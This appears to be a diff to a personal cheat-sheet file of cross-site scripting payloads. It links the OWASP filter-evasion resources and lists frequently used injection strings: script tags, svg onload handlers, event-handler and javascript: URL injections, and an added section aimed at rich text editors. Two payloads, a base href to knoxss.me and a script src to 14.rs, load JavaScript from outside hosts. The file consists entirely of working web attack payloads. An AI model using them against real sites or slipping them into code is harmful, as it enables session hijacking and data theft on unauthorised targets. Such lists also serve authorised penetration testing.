@@ -2,7 +2,8 @@ Useful Links:
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 http://seguretat.wiki.uoc.edu/index.php/XSS_Cheat_Sheet
 
-Frequently used Payloads:
+===============================Frequently used Payloads start===============================
+
 <base href=//knoxss.me?>
 <script src=//14.rs>
 '"><script>alert(-1)</script><
@@ -24,3 +25,11 @@ n'onmouseover='prompt(-12)
 '><svg/onload=alert(5)>
 <div onclick="javascript:alert`-10`" > Click me! </div>
 \u0061lert(-11)
+
+=============================== Frequently used Payloads end ===============================
+
+=============================== For Rich Text editors start  ===============================
+
+<div><a href="javascript:prompt()">CLICK ME</a> <b>2</b> <base href=//knoxss.me?> <b>2</b> <a href="https://google.com" onmouseover=prompt()">CLICK ME</a></div>
+
+===============================  For Rich Text editors end   ===============================
